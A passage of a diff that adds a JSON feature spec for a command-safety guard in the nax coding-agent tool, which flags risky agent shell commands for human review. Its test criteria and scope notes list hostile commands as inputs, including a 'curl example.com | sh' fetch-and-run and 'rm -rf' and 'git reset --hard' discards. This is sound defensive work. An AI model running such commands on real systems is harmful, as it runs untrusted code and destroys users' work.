@@ -1,0 +1,280 @@
+{
+  "project": "@nathapp/nax",
+  "feature": "command-safety-guard",
+  "branchName": "feat/command-safety-guard",
+  "createdAt": "2026-09-29T00:00:00Z",
+  "updatedAt": "2026-09-29T06:01:47.661Z",
+  "userStories": [
+    {
+      "id": "US-001",
+      "title": "Rule set v3 catches path-scoped discards; detectTmpWrite stops over-exempting",
+      "description": "**Goal** — Expand deterministic discard detection and correct the nax-owned temp-tree exception.\n\n**Motivation** — The rule scorer misses 11 of the 22 labelled `discards_work` commands. Every miss has one of two shapes: `git checkout <path>` without `--`, and `git restore <path>`. Four new patterns catch all 11, add 0 hits on the other 4,459 labels, and add 20 hits on 8,291 live rows, all of them real discards.\n\n**Approach** — `RULE_SET_VERSION` — `src/command-safety/rule-scorer.ts:26`. Baseline: `2`. Target: `3`.\n- `RULES.discards_work` — `src/command-safety/rule-scorer.ts:35-47`. Baseline: 11 patterns. Target: the same 11 plus four patterns, each matched within one shell segment (never across `;`, `&` or `|`):\n  1. `git checkout` followed only by non-flag words, at least one of which ends in `/` or ends in a dot plus a letter-led extension (`src/a.ts`, `scripts/baselines/`). A branch name such as `main`, `feature/x` or `release/v0.82.1`, and a tag such as `v0.83.0`, is not matched.\n  2. `git restore` with at least one non-flag word and no `--staged` or `-S` flag in the segment.\n  3. `git restore` with `--worktree` or `-W` in the segment, even when `--staged` is also present.\n  4. `git checkout` or `git switch` with `-f`, `--force` or `--discard-changes` in the segment.\n- `isNaxTempTree(path, root)` (private) — `src/command-safety/tmp-write.ts:66`. Baseline: exempts `<root>/nax/…` and any path starting with `<root>/nax-`. Target: exempts `<root>/nax/…` and `<root>/nax-<digits>` where the digits are the whole path segment (the per-user fallback `/tmp/nax-<uid>`), and nothing else. Update the obsolete `/tmp/nax-r1` test to `/tmp/nax/r1`, and the stale tmp-write and `signals.tmpWrite` docs.\n\n**Scope** — In: version, four bounded patterns, exact nax exemption, existing tests and docs. Out: new temp-only predicate (US-002), guard scoring/config (US-003), runtime ask routing (US-004); A rule for moving a tracked source file out of the repo (`mv src/x.ts /tmp/x`); it is labelled `deletes_data` (2 labelled misses) and belongs to a later rule-set change.\n\n**Interface**\n```typescript\nexport const RULE_SET_VERSION = 3;\nexport function scoreRules(command: string, context?: RuleContext): RuleResult;\nexport function detectTmpWrite(command: string, cwd?: string): boolean;\n```",
+      "acceptanceCriteria": [
+        "scoreRules(\"git checkout src/cli/approvals.ts\").hits.discards_work returns true.",
+        "scoreRules(\"git checkout scripts/baselines/\").hits.discards_work returns true.",
+        "scoreRules(\"git checkout HEAD src/index.ts\").hits.discards_work returns true.",
+        "scoreRules(\"bun test && git checkout docs/guides/cli-reference.md\").hits.discards_work returns true.",
+        "scoreRules(\"git restore test/unit/config/schemas-review.test.ts\").hits.discards_work returns true.",
+        "scoreRules(\"git restore --staged --worktree src/a.ts\").hits.discards_work returns true.",
+        "scoreRules(\"git restore --staged src/a.ts\").hits.discards_work returns false.",
+        "scoreRules(\"git restore -S src/a.ts\").hits.discards_work returns false.",
+        "scoreRules(\"git checkout -f main\").hits.discards_work returns true.",
+        "scoreRules(\"git switch --discard-changes main\").hits.discards_work returns true.",
+        "scoreRules(c).hits.discards_work returns false for each of `git checkout main`, `git checkout feature/x`, `git checkout -b feature/new`, `git checkout release/v0.82.1` and `git checkout v0.83.0`.",
+        "scoreRules(\"git checkout main; ls src/\").hits.discards_work returns false; a path in a later segment does not make an earlier branch checkout a discard.",
+        "scoreRules(\"git restore src/a.ts; git diff --staged\").hits.discards_work returns true; a `--staged` in a later segment does not suppress the restore.",
+        "When reading `RULE_SET_VERSION` and `scoreRules(\"ls\").version`, then both equal 3.",
+        "detectTmpWrite(\"echo x > /tmp/nax-red-check/a.txt\") returns true.",
+        "detectTmpWrite(\"cp a.txt /private/tmp/nax-scratch/a.txt\") returns true.",
+        "detectTmpWrite(\"echo x > /tmp/nax-501/r1/a.txt\") returns false; a numeric per-user fallback root stays exempt.",
+        "detectTmpWrite(\"echo x > /tmp/nax/r1/a.txt\") returns false.",
+        "detectTmpWrite(\"echo x > /tmp/nax-501x/a.txt\") returns true; the fallback segment must be all digits."
+      ],
+      "tags": [
+        "feature",
+        "command-safety",
+        "rules"
+      ],
+      "dependencies": [],
+      "status": "passed",
+      "passes": true,
+      "attempts": 0,
+      "escalations": [],
+      "routing": {
+        "complexity": "medium",
+        "testStrategy": "three-session-tdd",
+        "reasoning": "Localized deterministic patterns and path-boundary correction are medium-sized, but the resulting rule hits narrow command permissions, so the access-control security override requires strict TDD.",
+        "initialComplexity": "medium",
+        "modelTier": "balanced",
+        "initialModelTier": "balanced"
+      },
+      "contextFiles": [
+        "src/command-safety/rule-scorer.ts",
+        "src/command-safety/tmp-write.ts",
+        "src/command-safety/types.ts",
+        "test/unit/command-safety/rule-scorer.test.ts",
+        "test/unit/command-safety/tmp-write.test.ts"
+      ],
+      "modifiedFiles": [
+        {
+          "path": "test/unit/command-safety/rule-scorer.test.ts",
+          "reason": "the test \"version is 2 and every category is reported\" asserts `RULE_SET_VERSION` is `2`. The rule set gains four `discards_work` patterns, which bumps it to `3`, so the assertion becomes `3`; the category-list assertion is unchanged."
+        },
+        {
+          "path": "test/unit/command-safety/tmp-write.test.ts",
+          "reason": "the test \"US-005 AC7: nax's own /tmp/nax-* run directory is not counted\" asserts that a write into the legacy run directory tmp/nax-r1 is not counted. Since #2285 no run directory has that layout: nax's own temp trees are tmp/nax/(runId) and the all-digit per-user fallback tmp/nax-(uid), and the confined sandbox denies writes to any other tmp/nax-(name) directory. The assertion becomes: a write to the same file under tmp/nax/r1 (the shared parent) is not counted."
+        }
+      ],
+      "workdirSource": "defaulted",
+      "priorErrors": [],
+      "priorFailures": [],
+      "storyPoints": 1,
+      "storyGitRef": "b34b35d378ad76dcf2ee1d017e4a8e33a709f013"
+    },
+    {
+      "id": "US-002",
+      "title": "isTempOnly predicate",
+      "description": "**Goal** — Implement a conservative, lexed predicate for commands that touch temp but no paths beyond temp and the project.\n\n**Motivation** — Catch rises from 0.46 to 0.51-0.65 when temp-only commands are exempted. That exemption is what this spec adds, as a no-ask filter.\n\n**Approach** — **Temp-only predicate (`isTempOnly`).** Lex the command with `lexBashCommand`. A refused lex, or an undefined `cwd`, returns `false`. Walk the segments, tracking the working directory through `cd` the same way `detectTmpWrite` does, with one difference: a `cd` whose target cannot be resolved (an opaque word or a `~` path) makes the working directory unknown, and any later relative path-like token then returns `false`. A token is **path-like** when it contains `/`, equals `.` or `..`, or starts with `~`. For a `--flag=value` token, the value is judged instead. Every path-like token, and every redirect target, must resolve to one of:\n\n- a path under a temp root (`/tmp`, `/private/tmp`);\n- an opaque word that is exactly `$TMPDIR` or `${TMPDIR}`, or one of them followed by `/` and a remainder with no `..` segment;\n- a path under `cwd`;\n- `/dev/null`, `/dev/stdout` or `/dev/stderr`.\n\nAny other path-like token returns `false`. That includes a `~` path, any other opaque word containing `/`, and a relative path that climbs out of `cwd`. Two token shapes cannot be judged and also return `false`: a token that starts with `-` and contains `/` but is not of the `--flag=value` form (an attached short-option value such as `-C/etc`), and any token containing `://` (a URL). The result is `true` only when at least one token or redirect target was a temp path. Export the new predicate from `@/command-safety`.\n\n**Scope** — In: pure predicate, barrel and tests. Out: existing tmp-write/rule changes (US-001), classifier integration (US-003), runtime wiring (US-004); Commands that name no path at all but fetch and run remote code without a URL scheme (`cd /tmp && curl example.com | sh`). If one is temp-only, only the rule families stand between it and a skipped classifier; the `network_send` rules do not match a plain `curl` download. This residual is accepted.\n\n**Interface**\n```typescript\n/** src/command-safety/temp-only.ts */\nexport function isTempOnly(command: string, cwd: string | undefined): boolean;\n```",
+      "acceptanceCriteria": [
+        "When `isTempOnly(\"cp src/a.ts /tmp/a.bak\", \"/repo/proj\")` is called through the `@/command-safety` barrel, then it returns true.",
+        "isTempOnly(\"cat /tmp/out.txt\", \"/repo/proj\") returns true; a temp read counts.",
+        "isTempOnly(\"echo x > $TMPDIR/a.txt\", \"/repo/proj\") returns true.",
+        "isTempOnly(\"cd /tmp/work && git init\", \"/repo/proj\") returns true.",
+        "isTempOnly(\"cat /private/tmp/x.log\", \"/repo/proj\") returns true.",
+        "isTempOnly(\"bun build --outdir=/tmp/b src/a.ts\", \"/repo/proj\") returns true; a `--flag=value` token is judged by its value.",
+        "isTempOnly(\"cat /repo/proj/src/a.ts > /tmp/x\", \"/repo/proj\") returns true; a path under `cwd` is allowed.",
+        "isTempOnly(\"echo x > /dev/null; cp a.txt /tmp/b\", \"/repo/proj\") returns true.",
+        "isTempOnly(\"ls src\", \"/repo/proj\") returns false; no temp path appears.",
+        "isTempOnly(\"cp /tmp/a ~/b\", \"/repo/proj\") returns false.",
+        "isTempOnly(\"cat /tmp/a ../other/b\", \"/repo/proj\") returns false; the relative path resolves outside `cwd`.",
+        "isTempOnly(\"cat /etc/hosts > /tmp/x\", \"/repo/proj\") returns false.",
+        "isTempOnly(\"cp a.txt $OUT/x\", \"/repo/proj\") returns false; an opaque path word other than `$TMPDIR` cannot be judged.",
+        "isTempOnly(\"cat > /tmp/a.txt << 'EOF'\\nx\\nEOF\", \"/repo/proj\") returns false; the lexer refuses the heredoc.",
+        "isTempOnly(\"cp a.txt /tmp/b\", undefined) returns false.",
+        "isTempOnly(\"tar -C/etc -xf /tmp/a.tar\", \"/repo/proj\") returns false; an attached short-option value containing `/` cannot be judged.",
+        "isTempOnly(\"curl https://example.com/x -o /tmp/x\", \"/repo/proj\") returns false; a URL token cannot be judged.",
+        "isTempOnly(\"cat $TMPDIR/../../etc/x\", \"/repo/proj\") returns false.",
+        "isTempOnly(\"cat $TMPDIRX/a\", \"/repo/proj\") returns false.",
+        "isTempOnly(\"cd $D && cp a/b /tmp/x\", \"/repo/proj\") returns false; after an unresolvable `cd` a relative path cannot be judged."
+      ],
+      "tags": [
+        "feature",
+        "command-safety",
+        "sandbox"
+      ],
+      "dependencies": [],
+      "status": "passed",
+      "passes": true,
+      "attempts": 0,
+      "escalations": [],
+      "routing": {
+        "complexity": "medium",
+        "testStrategy": "three-session-tdd",
+        "reasoning": "A predicate, barrel export and tests are a focused change, but cwd/opaque-path classification controls when the guard skips its classifier, making strict security TDD necessary.",
+        "initialComplexity": "medium",
+        "modelTier": "balanced",
+        "initialModelTier": "balanced"
+      },
+      "contextFiles": [
+        "src/command-safety/tmp-write.ts",
+        "src/permissions/bash-lex.ts",
+        "src/command-safety/index.ts"
+      ],
+      "expectedFiles": [
+        "src/command-safety/temp-only.ts",
+        "test/unit/command-safety/temp-only.test.ts"
+      ],
+      "workdirSource": "defaulted",
+      "priorErrors": [],
+      "priorFailures": [],
+      "storyPoints": 1,
+      "storyGitRef": "2369dcac1907d4da072e0bfe9a05f184c131a73f"
+    },
+    {
+      "id": "US-003",
+      "title": "Guard configuration and rule-or-mean scoring",
+      "description": "**Goal** — Offer an opt-in validated guard whose total assessment shares the shadow classifier cache.\n\n**Motivation** — P5 shipped the classifier as a shadow that decides nothing (master plan D4a: a model is a flag-for-review guardrail, never an auto-approver). The promotion ratchet required a labelled corpus and a threshold ruling before going live.\n\n**Approach** — **Guard scoring (`assess`).** The composition is an ordered pipeline:\n\n1. **Temp-only check.** If `tempConfined` is true and `isTempOnly(command, cwd)` is true, the guard does not consult the classifier. The shadow row, opened first, still classifies the command. The score is `1` if any rule category **other than `outside_project`** hits, and `0` otherwise. The basis is `\"temp-only\"`.\n2. **Rules.** `ruleScore` is `1` when any of the six rule categories hits, else `0`.\n3. **Model.** Await the cached classification.\n   - `answered`: `harm = 1 - P(none)`, `noulMax = max P(yes)` over the six noul questions, `modelScore = (harm + noulMax) / 2`. The score is `max(ruleScore, modelScore)` and the basis is `\"model\"`.\n   - `blocked`: the score is `1` and the basis is `\"model\"`.\n   - `oversize` or `unavailable` (timeout, transport error, classifier threw): the score is `ruleScore` and the basis is `\"rules\"`.\n4. **Flag.** `flagged = score >= threshold`.\n5. **Category.** When a rule hits, the category is the first hit in `QUESTION_IDS` order, skipping `outside_project` when the temp-only check applied. Otherwise, for an answered model, it is the harm option other than `none` with the highest probability (ties go to `QUESTION_IDS` order). It is absent for a `blocked` result with no rule hit, and for an unflagged decision.\n\nThis is the scorer measured in `p5-labels-rescore-2026-09-29` as `ruleOrMean`, with the exemption measured as `tmpOnly`. One deliberate difference: a temp-only command that trips a non-`outside_project` rule (e.g. `rm -rf /tmp/x` hits `deletes_data`) still flags. `CommandSafetyConfigSchema` target is `{ shadow?: CommandSafetyShadow; guard?: { threshold: number } }`; threshold is greater than 0 and at most 1, default 0.75. Guard without shadow fails with `commandSafety.guard requires commandSafety.shadow (the guard reuses its classifier)`. `CommandShadowOptions` adds `readonly guard?: { readonly threshold: number }`; `BuildCommandShadowOptions.config` carries `guard?: { threshold: number }` and forwards it to `createCommandShadow`. The shadow awaits its existing `classifyCached` promise; no duplicate classify call when observe and guard both score. Update the 'never a gate' rule-scorer header, 'Observational only' types header, and `execution.commandSafety` description to 'Command classifier: shadow rows, plus the optional flag-for-review guard'; add descriptions for the two guard config keys. The fixture uses createCommandShadow, recording classifier, no-op write, runId `r1`, timeoutMs 1000 and threshold 0.75. The high answered result has harm none 0.1, discards_work 0.6, other five categories 0.06 each, and every noul P(yes) 0.9, yielding 0.9; low has harm none 0.94, each category 0.01, every noul P(yes) 0.05, yielding 0.055.\n\n**Scope** — In: scoring, types, config, build/shadow wiring, barrel, descriptions, tests, stale header comments. Out: rule patterns (US-001), predicate (US-002), tool ask routing (US-004); configurable scoring and classifier model/calibration changes are deferred.\n\n**Interface**\n```typescript\nexport interface GuardInput {\n  readonly command: string;            // policy identity Bash: the command string; Exec (a RunCommand argv call): argv joined with single spaces\n  readonly cwd?: string;               // the policy root\n  readonly tempConfined: boolean;      // the session's sandbox confines temp writes (#2285)\n}\nexport interface GuardDecision {\n  readonly flagged: boolean;\n  readonly score: number;              // 0..1\n  readonly threshold: number;\n  readonly basis: \"model\" | \"rules\" | \"temp-only\";\n  readonly category?: QuestionId;      // present when flagged and a category is known\n}\nexport interface CommandGuard {\n  readonly threshold: number;\n  /** Total: never rejects. */\n  assess(input: GuardInput): Promise<GuardDecision>;\n}\n/** src/command-safety/guard.ts — pure; the shadow awaits classifyCached and passes the ModelResult in.\n *  `model` is undefined when the temp-only check skipped the classifier. */\nexport function scoreGuard(input: {\n  readonly rules: RuleResult;\n  readonly model: ModelResult | undefined;\n  readonly tempOnly: boolean;\n  readonly threshold: number;\n}): GuardDecision;\nexport interface CommandShadow {\n  observe(key: string, obs: Observation): void;\n  settle(key: string, outcome: FinalOutcome, run?: ExecRun): void;\n  drain(): Promise<void>;\n  readonly guard?: CommandGuard;\n}\n```",
+      "acceptanceCriteria": [
+        "CommandSafetyConfigSchema.parse({ shadow: { url: \"http://127.0.0.1:8020/x\" }, guard: {} }).guard.threshold returns 0.75.",
+        "CommandSafetyConfigSchema.safeParse({ guard: { threshold: 0.6 } }) fails with an issue whose message is `commandSafety.guard requires commandSafety.shadow (the guard reuses its classifier)`.",
+        "CommandSafetyConfigSchema.safeParse({ shadow: { url: \"http://127.0.0.1:8020/x\" }, guard: { threshold: 1.5 } }) fails.",
+        "CommandSafetyConfigSchema.safeParse({ shadow: { url: \"http://127.0.0.1:8020/x\" }, guard: { threshold: 0 } }) fails; the threshold must be greater than 0.",
+        "When reading `FIELD_DESCRIPTIONS[\"execution.commandSafety.guard\"]` and `FIELD_DESCRIPTIONS[\"execution.commandSafety.guard.threshold\"]`, then both are non-empty strings.",
+        "CommandSafetyConfigSchema.parse({ shadow: { url: \"http://127.0.0.1:8020/x\" } }).guard returns undefined.",
+        "When `buildCommandShadow` receives config with shadow and no guard, then its returned shadow.guard is undefined.",
+        "When `buildDispatchAskWiring` receives execution.commandSafety `{ shadow: { url: \"http://127.0.0.1:8020/x\", timeoutMs: 3000, authEnv: \"NAX_COMMAND_SAFETY_AUTH\", allowRemote: false }, guard: { threshold: 0.6 } }`, then wiring.commandShadow.guard.threshold equals 0.6.",
+        "When the guard fixture receives the high answered result, then `guard.assess({ command: \"ls\", cwd: \"/repo/proj\", tempConfined: false })` resolves flagged true, basis `model`, score 0.9 within 1e-9, and category `discards_work`.",
+        "When the guard fixture receives the low answered result, then `guard.assess({ command: \"ls\", cwd: \"/repo/proj\", tempConfined: false })` resolves flagged false and basis `model`.",
+        "When the guard fixture receives the low answered result, then `guard.assess({ command: \"git reset --hard\", cwd: \"/repo/proj\", tempConfined: false })` resolves flagged true, score 1, basis `model` and category `discards_work`, because a rule hit scores 1.",
+        "When the guard fixture classifier returns `{ status: \"unavailable\", error: \"timeout\" }`, then `guard.assess({ command: \"git checkout src/a.ts\", cwd: \"/repo/proj\", tempConfined: false })` resolves flagged true, basis `rules` and category `discards_work`.",
+        "When the guard fixture classifier returns `{ status: \"unavailable\", error: \"timeout\" }`, then `guard.assess({ command: \"ls\", cwd: \"/repo/proj\", tempConfined: false })` resolves flagged false, score 0 and basis `rules`.",
+        "When the guard fixture classifier returns `{ status: \"oversize\", latencyMs: 1 }`, then `guard.assess({ command: \"ls\", cwd: \"/repo/proj\", tempConfined: false })` resolves flagged false and basis `rules`.",
+        "When the guard fixture classifier returns `{ status: \"blocked\", latencyMs: 1 }`, then `guard.assess({ command: \"ls\", cwd: \"/repo/proj\", tempConfined: false })` resolves flagged true, score 1, basis `model`, and no category.",
+        "When the guard fixture classify throws synchronously, then `guard.assess({ command: \"ls\", cwd: \"/repo/proj\", tempConfined: false })` resolves (does not reject) flagged false and basis `rules`.",
+        "When the guard fixture receives the high answered result, then `guard.assess({ command: \"cp src/a.ts /tmp/a.bak\", cwd: \"/repo/proj\", tempConfined: true })` resolves flagged false with basis `temp-only`, and the stub classify records no call.",
+        "When the guard fixture receives the low answered result, then `guard.assess({ command: \"rm -rf /tmp/x\", cwd: \"/repo/proj\", tempConfined: true })` resolves flagged true with basis `temp-only` and category `deletes_data`.",
+        "When the guard fixture receives the high answered result, then `guard.assess({ command: \"cp src/a.ts /tmp/a.bak\", cwd: \"/repo/proj\", tempConfined: false })` resolves basis `model`, and stub classify records the command once.",
+        "When the low-answer guard fixture calls observe for `bun run test` and then `guard.assess({ command: \"bun run test\", cwd: \"/repo/proj\", tempConfined: false })`, then stub classify records exactly one call.",
+        "When the guard fixture uses threshold 0.5 and an answered result with harm none 0.5, deletes_data 0.5, and every noul P(yes) 0.5, then `guard.assess({ command: \"ls\", cwd: \"/repo/proj\", tempConfined: false })` resolves flagged true; a score equal to the threshold flags.",
+        "When `createCommandShadow` is called without a guard option, then its returned shadow.guard is undefined.",
+        "When the guard fixture classifier returns `{ status: \"unavailable\", error: \"timeout\" }`, then `guard.assess({ command: \"sudo git reset --hard\", cwd: \"/repo/proj\", tempConfined: false })` resolves category `discards_work`; with both `discards_work` and `privilege` hitting, the first in `QUESTION_IDS` order wins."
+      ],
+      "tags": [
+        "feature",
+        "command-safety",
+        "security",
+        "config"
+      ],
+      "dependencies": [
+        "US-001",
+        "US-002"
+      ],
+      "status": "passed",
+      "passes": true,
+      "attempts": 0,
+      "escalations": [],
+      "routing": {
+        "complexity": "complex",
+        "testStrategy": "three-session-tdd",
+        "reasoning": "New permission-narrowing guard across config, model cache and scoring; access-control security override requires strict isolation.",
+        "initialComplexity": "complex",
+        "modelTier": "balanced",
+        "initialModelTier": "balanced"
+      },
+      "contextFiles": [
+        "src/config/schemas-command-safety.ts",
+        "src/command-safety/shadow.ts",
+        "src/command-safety/types.ts",
+        "src/command-safety/build.ts",
+        "src/cli/config-descriptions.ts"
+      ],
+      "expectedFiles": [
+        "src/command-safety/guard.ts",
+        "test/unit/command-safety/guard.test.ts",
+        "test/unit/config/command-safety-guard-config.test.ts"
+      ],
+      "workdirSource": "defaulted",
+      "priorErrors": [],
+      "priorFailures": [],
+      "storyPoints": 1,
+      "storyGitRef": "8ba5a39613e1148e14eb1460b85e57c339aabc86"
+    },
+    {
+      "id": "US-004",
+      "title": "The runtime turns a flagged allowed call into an ask",
+      "description": "**Goal** — Route guarded allowed Bash and Exec calls through existing approval and thread sandbox confinement into assessments.\n\n**Motivation** — P5 shipped the classifier as a shadow that decides nothing (master plan D4a: a model is a flag-for-review guardrail, never an auto-approver).\n\n**Approach** — **Runtime wiring.** In `callTool`, when the verdict is allowed, the policy identity is `Bash` or `Exec`, and `opts.commandShadow?.guard` exists, await `guard.assess({ command, cwd: policy.root, tempConfined })`. On `flagged`, synthesise a denied verdict:\n\n```typescript\n{ allowed: false, outcome: \"ask\", breach: false, rule: \"command-safety\",\n  reason: `flagged for review by command safety: ${category ?? \"blocked\"} (score ${score.toFixed(2)} >= ${threshold})`,\n  resolvedPaths: verdict.resolvedPaths }\n```\n\nHand it to the existing `resolveAskOutcome`. When not flagged, call `runTool` as today. The helper that does this lives in `src/tools/runtime-calltool.ts`, so `runtime.ts` (479 lines) grows by only the call site. The check is on the **policy identity** from `resolvePolicyIdentity`: `Bash`, or `Exec`, which is what a `RunCommand` call carrying `argv` resolves to. `Exec` itself is a capability marker, not a registered tool. `buildCodingToolSupport(args)` passes `tempConfined: isTempConfined(args.launcher)` to `createCodingToolRuntime`. The check lives in a helper because `buildCodingToolSupport` sits exactly at its complexity baseline (`scripts/baselines/complexity-baseline.json`, 38), and `check:complexity` rejects any growth. `isTempConfined(launcher: CommandLauncher | undefined): boolean` is exported from `src/agents/coding-tool-sandbox.ts`; it returns `true` exactly when `launcher?.state.kind === \"available\"` and `launcher.state.sharedTmp === false`. The tap is opened before guard assessment, so observe starts shared classification; the policy's mechanical verdict remains allow. Headless asks refuse without running a tool. If guard.assess rejects despite its contract, run the permitted tool and log `getSafeLogger()?.warn(\"command-safety\", \"Command-safety guard failed; the call runs unguarded\", { error })` once per rejecting call. Update the inaccurate runtime/support comments and docs/guides/sandbox-and-command-safety.md to describe guard config and headless refusal. Runtime tests use a recording extraTools Bash stub with the real Bash scope returning `{ content: \"ok\" }`, looked up before global tools. Support tests use root, declared Bash, wildcard Bash grant, raw approval, recording launcher and commandShadow with recording guard resolving flagged false.\n\n**Scope** — In: allowed-call guard/ask route, rejected-guard fallback, sandbox state helper/threading, docs and tests. Out: scorer/config (US-003), predicate (US-002), rule set (US-001); changing ask-channel behavior, guarding RunCommand verb calls, changing turn cancellation during classifier wait or enabling guard by default.\n\n**Interface**\n```typescript\nexport function isTempConfined(launcher: CommandLauncher | undefined): boolean;\nexport function createCodingToolRuntime(opts: {\n  policy: ToolPolicy;\n  commandShadow?: CommandShadow;\n  tempConfined?: boolean; // absent reads as false\n  // existing runtime options unchanged\n}): CodingToolRuntime;\n```",
+      "acceptanceCriteria": [
+        "When an allowed Bash call `git checkout src/a.ts` has a guard assessment `{ flagged: true, score: 0.9, threshold: 0.75, basis: \"model\", category: \"discards_work\" }` and no askResolver, then runtime.callTool returns kind `denied` with reason containing `flagged for review by command safety: discards_work (score 0.90 >= 0.75)` and `no approval channel is configured`, and Bash never runs.",
+        "When the same flagged Bash call has an askResolver returning `{ decision: \"allow\", decidedBy: \"test\", latencyMs: 1 }`, then runtime.callTool returns kind `ok`, Bash runs once, and the resolver records one request with rule `command-safety` and command `git checkout src/a.ts`.",
+        "When the same flagged Bash call has an askResolver returning `{ decision: \"deny\", decidedBy: \"human\", latencyMs: 1 }`, then runtime.callTool returns kind `denied` and Bash never runs.",
+        "When guard.assess resolves flagged false for an allowed `callTool(\"Bash\", { command: \"ls\" })`, then runtime.callTool returns kind `ok`, Bash runs once, and the askResolver receives no request.",
+        "When policy denies `callTool(\"Bash\", { command: \"ls\" })`, then guard.assess is never called.",
+        "When policy returns ask for `callTool(\"Bash\", { command: \"ls\" })`, then guard.assess is never called and the askResolver records exactly one request whose rule is not `command-safety`.",
+        "When `callTool(\"Read\", { path: \"a.txt\" })` is allowed, then guard.assess is never called.",
+        "When commandShadow has no guard and an allowed `callTool(\"Bash\", { command: \"ls\" })` runs, then runtime.callTool returns kind `ok`.",
+        "When `createCodingToolRuntime` receives `tempConfined: true` and policy root `/repo/proj`, then `callTool(\"Bash\", { command: \"ls\" })` calls guard.assess with `{ command: \"ls\", cwd: \"/repo/proj\", tempConfined: true }`.",
+        "When `createCodingToolRuntime` omits tempConfined, then allowed `callTool(\"Bash\", { command: \"ls\" })` passes tempConfined false to guard.assess.",
+        "When a runtime uses the real `createCommandShadow` guard fixture with a low answer and headless resolver, then `callTool(\"Bash\", { command: \"git checkout src/a.ts\" })` returns kind `denied` and stub classify records that command exactly once.",
+        "When guard.assess rejects with `new Error(\"boom\")` on allowed `callTool(\"Bash\", { command: \"ls\" })`, then Bash runs once, runtime.callTool returns kind `ok`, and `getSafeLogger()` records exactly one warn at stage `command-safety` with message `Command-safety guard failed; the call runs unguarded`.",
+        "When a runtime with `compileToolPolicy([{ tool: \"Exec\", patterns: [\"*\"] }], \"/repo\")`, `createRunCommandTool(new Map(), { exec })`, no askResolver and a flagging guard calls `callTool(\"RunCommand\", { argv: [\"git\", \"checkout\", \"src/a.ts\"] })`, then guard.assess receives command `git checkout src/a.ts` and the result is kind `denied`.",
+        "When `buildCodingToolSupport` receives an available launcher with state `{ kind: \"available\", backend: \"srt\", network: \"open\", sharedTmp: false }`, then its runtime's allowed `callTool(\"Bash\", { command: \"ls\" })` passes tempConfined true to guard.assess.",
+        "When `buildCodingToolSupport` receives an available launcher with state `{ kind: \"available\", backend: \"srt\", network: \"open\" }` (no sharedTmp), then its runtime's allowed Bash call passes tempConfined false to guard.assess.",
+        "When `buildCodingToolSupport` receives a launcher with state `DISABLED_SANDBOX_STATE`, then its runtime's allowed Bash call passes tempConfined false to guard.assess."
+      ],
+      "tags": [
+        "feature",
+        "security",
+        "tools",
+        "sandbox"
+      ],
+      "dependencies": [
+        "US-003"
+      ],
+      "status": "passed",
+      "passes": true,
+      "attempts": 0,
+      "escalations": [],
+      "routing": {
+        "complexity": "expert",
+        "testStrategy": "three-session-tdd",
+        "reasoning": "Cross-cutting access-control integration at tool execution with ask routing, sandbox state, audit and fail-open error handling.",
+        "initialComplexity": "expert",
+        "modelTier": "powerful",
+        "initialModelTier": "powerful"
+      },
+      "contextFiles": [
+        "src/tools/runtime.ts",
+        "src/tools/runtime-calltool.ts",
+        "src/agents/coding-tool-support.ts",
+        "src/agents/coding-tool-sandbox.ts",
+        "test/unit/agents/coding-tool-support-sandbox-wrapped.test.ts"
+      ],
+      "expectedFiles": [
+        "test/unit/tools/runtime-command-guard.test.ts",
+        "test/unit/agents/coding-tool-support-temp-confined.test.ts"
+      ],
+      "workdirSource": "defaulted",
+      "priorErrors": [],
+      "priorFailures": [],
+      "storyPoints": 1,
+      "storyGitRef": "7baddd4ab4bf0952ab2c170af5f10f991d569821"
+    }
+  ],
+  "analysis": "This is an enhancement to existing TypeScript/Bun code. src/command-safety/rule-scorer.ts:26-62 defines version 2 and 11 discard rules; scoreRules at :134 masks the project root for outside_project only. New discard patterns must not cross shell separators; existing tests are test/unit/command-safety/rule-scorer.test.ts:5-112. src/command-safety/tmp-write.ts:66-73 mistakenly exempts all nax-* names and :89-105 uses lexed redirects, write targets and working-directory frames; update the obsolete nax-r1 assertion in test/unit/command-safety/tmp-write.test.ts:28-70. src/permissions/bash-lex.ts:22-61 defines token opacity, segments, redirects and refusal; lexBashCommand starts at :104. The new predicate should reuse its lexer, reject refused syntax, reject unjudgable paths and propagate unknown cwd after unresolvable cd. src/command-safety/types.ts:11-24 orders six QUESTION_IDS; :39-58 defines ModelResult; :89-99 defines CommandShadow; :130-138 documents tmpWrite. src/command-safety/shadow.ts:25-32 declares options, :68-98 caches classification by exact command and :151-203 implements total observe/settle/drain; guard assessment must reuse the cached promise without adding row fields. src/command-safety/build.ts:18-52 structurally types config without importing src/config and creates the classifier; src/config/schemas-command-safety.ts:46-50 contains the Zod config and src/cli/config-descriptions.ts:132-140 maps execution keys. src/interaction/dispatch-ask.ts:165-175 already forwards commandSafety whole to buildCommandShadow. Export new APIs in src/command-safety/index.ts:1-28. src/tools/runtime.ts:122-180 accepts runtime options and defaults to the headless resolver; :301-478 checks policy, opens shadow tap, resolves policy ask/deny then runs allowed tools. src/tools/runtime-calltool.ts:75-94 maps argv calls to Exec policy identity, :97-134 opens the shadow tap and :136-209 resolves asks and cancellation. New guard checks must occur only on allowed Bash/Exec calls after tap opening, preserving mechanical allow and logging denied:ask on refusal. src/agents/coding-tool-support.ts:178-184 treats Exec as a capability marker and :239-283 constructs the runtime; its frozen complexity baseline is 38. src/agents/coding-tool-sandbox.ts:177-197 provides launcher state helpers: confinement requires kind available and sharedTmp === false. Existing runtime and wiring tests include test/unit/tools/runtime-command-shadow.test.ts, test/unit/tools/runtime-calltool-edges.test.ts, test/unit/command-safety/shadow.test.ts, test/unit/config/command-safety-config.test.ts and the stub launcher in test/unit/agents/coding-tool-support-sandbox-wrapped.test.ts:25-64. docs/guides/sandbox-and-command-safety.md:1-20 incorrectly says the shadow decides nothing; update for optional guard. Migration is opt-in: no guard preserves all current policy behavior and shadow rows; guard requires shadow, defaults to threshold 0.75, uses the unchanged ask resolver, and never broadens a deny or ask. Rule-set v3 and numeric-only nax fallback change prior rule and tmp signal outputs; accepted branch-extension and no-URL remote-code residuals are explicit feature exclusions.",
+  "outOfScope": [
+    "Recording the guard's decision (score, basis, category) on the command-safety row. It is derivable offline: a row with mechanical `allow` and outcome `denied:ask`, plus the row's rules and model answers.",
+    "A per-run ask budget, rate limit or de-duplication of guard asks beyond the existing approvals cache.",
+    "A rule for moving a tracked source file out of the repo (`mv src/x.ts /tmp/x`); it is labelled `deletes_data` (2 labelled misses) and belongs to a later rule-set change.",
+    "Making the scorer configurable; `ruleOrMean` is fixed. Only the threshold is configurable.",
+    "Changing the question set, the classifier model, or its calibration.",
